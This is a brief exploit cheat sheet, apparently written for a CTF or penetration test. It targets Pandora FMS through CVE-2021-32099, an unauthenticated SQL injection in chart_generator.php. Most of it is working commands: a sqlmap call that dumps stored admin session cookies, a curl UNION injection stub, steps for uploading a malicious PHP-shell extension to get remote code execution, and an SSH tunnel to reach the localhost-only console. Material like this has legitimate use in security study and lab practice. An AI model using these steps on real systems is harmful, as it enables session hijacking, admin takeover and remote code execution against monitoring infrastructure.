# Pandora FMS SQLi → Session Cookie Steal

Pandora FMS (network monitoring) <7.0 NG 749 has unauthenticated SQLi in the chart endpoint. Dump session cookies to impersonate admin.

```bash
# CVE-2021-32099 — SQLi in /include/chart_generator.php session parameter
sqlmap -u "http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1" \
  --dbms=mysql --dump -T tsessions_php -C id_session,data --batch

# Extract session data — look for id_usuario=admin
# Set cookie: PHPSESSID=<SESSION_ID>

# Alternatively via curl (blind boolean):
curl -s 'http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1 UNION SELECT ...'

# Once authenticated as admin → install/upload extension for RCE
# Admin > Extensions > Extension manager > upload malicious .zip with PHP shell
```

Reach Pandora FMS via SNMP credential from the same host (port 80 localhost-only). Use SSH tunnel: `ssh -L 8080:127.0.0.1:80 <USER>@<TARGET>`.
